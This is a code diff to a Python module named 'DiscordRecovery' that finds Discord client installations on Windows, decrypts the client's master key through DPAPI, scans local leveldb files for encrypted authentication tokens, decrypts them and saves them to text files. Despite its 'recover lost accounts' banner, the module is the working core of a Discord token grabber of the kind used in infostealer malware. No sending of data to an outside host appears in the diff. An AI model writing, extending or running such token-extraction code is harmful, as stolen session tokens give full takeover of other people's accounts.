@@ -39,12 +39,20 @@ class DiscordRecovery(ModuleManager):
   `-=========-`()       Recover Lost Discord Accounts
                 """)
 
-        self.browsers_folder = os.path.join(self.output_folder_user, 'browsers')
-        self.output_filename_csv = os.path.join(self.browsers_folder, 'browser_bookmarks_all.csv')
-        self.output_filename_json = os.path.join(self.browsers_folder, 'browser_bookmarks_all.json')
+        self.discord_folder = os.path.join(self.output_folder_user, 'applications', 'discord')
 
-        if not os.path.isdir(self.browsers_folder):
-            os.makedirs(self.browsers_folder)
+        if not os.path.isdir(self.discord_folder):
+            os.makedirs(self.discord_folder)
+        
+        self.discordInstallations = [
+                [f"{Constant.roaming_dir}/Discord","Discord"],
+                [f"{Constant.roaming_dir}/Lightcord","Lightcord"],
+                [f"{Constant.roaming_dir}/discordcanary","DiscordCanary"],
+                [f"{Constant.roaming_dir}/discordptb","DiscordPTB"]
+        ]
+        
+        self.tokensTMP = ''
+        self.tokensCount = 0
 
     def GetData(self, blob_out):
         cbData = int(blob_out.cbData)
@@ -64,7 +72,6 @@ class DiscordRecovery(ModuleManager):
         if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
             return self.GetData(blob_out)
 
-
     def DecryptValue(self, buff, master_key=None):
         starts = buff.decode(encoding='utf8', errors='ignore')[:3]
         if starts == 'v10' or starts == 'v11':
@@ -75,54 +82,46 @@ class DiscordRecovery(ModuleManager):
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
 
-    def GetDiscord(self, path, arg):
+    def GetDiscord(self, path, savefname):
         if not os.path.exists(f"{path}/Local State"):
+            self.merror(f"[{savefname}] Client is not available at: {path}. Continuing...")
             return
 
-        pathC = path + arg
+        pathC = path + "/Local Storage/leveldb"
 
         pathKey = path + "/Local State"
         with open(pathKey, 'r', encoding='utf-8') as f:
             local_state = json_loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
         master_key = self.CryptUnprotectData(master_key[5:])
-        # print(path, master_key)
+        self.mdebug(f"[{savefname}] Found and loaded master key")
 
+        tokens = []
         for file in os.listdir(pathC):
-            # print(path, file)
             if file.endswith(".log") or file.endswith(".ldb"):
+                self.mdebug(f"[{savefname}] Searching in {file}")
                 for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                     for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                        global Tokens
-                        tokenDecoded = self.DecryptValue(
-                            b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
-                        if not tokenDecoded in Tokens:
-                            Tokens += tokenDecoded
-                            print(tokenDecoded, path)
+                        tokenDecoded = self.DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                        if not tokenDecoded in self.tokensTMP:
+                            self.tokensTMP += tokenDecoded
+                            self.mdebug(f"[{savefname}] Found token in {file}")
+                            tokens.append(tokenDecoded)
+                            self.tokensCount += 1
 
-    
+        with open(os.path.join(self.discord_folder, f"{savefname}.txt"), 'w', encoding='utf-8') as file:
+            file.write('\n'.join(tokens))
+            self.mprint(f"[{savefname}] Saved {len(tokens)} tokens to {savefname}.txt")
+
     def run(self):
         try:
-
-            self.mdebug("Looking for the token in {}")
-
-            local = os.getenv('LOCALAPPDATA')
-            roaming = os.getenv('APPDATA')
-            temp = os.getenv("TEMP")
-            discordPaths = [
-                [f"{roaming}/Discord", "/Local Storage/leveldb"],
-                [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
-                [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
-                [f"{roaming}/discordptb", "/Local Storage/leveldb"],
-            ]
-
-            Threadlist = []
-            for patt in discordPaths:
-                a = threading.Thread(target=self.GetDiscord, args=[patt[0], patt[1]])
-                a.start()
-                Threadlist.append(a)
+            self.mdebug(f"Starting to look for discord tokens")
             
-            self.mprint("Found Token")
+            for patt in self.discordInstallations:
+                self.mdebug(f"Running `GetDiscord()` on {patt[1]} at {patt[0]}")
+                self.GetDiscord(path=patt[0], savefname=patt[1])
+            
+            self.mprint(f"Found a total of {self.tokensCount} Discord Tokens")
 
         except Exception as e:
             self.merror(f"Unable to locate any discord token: {e}. Skipping this module")
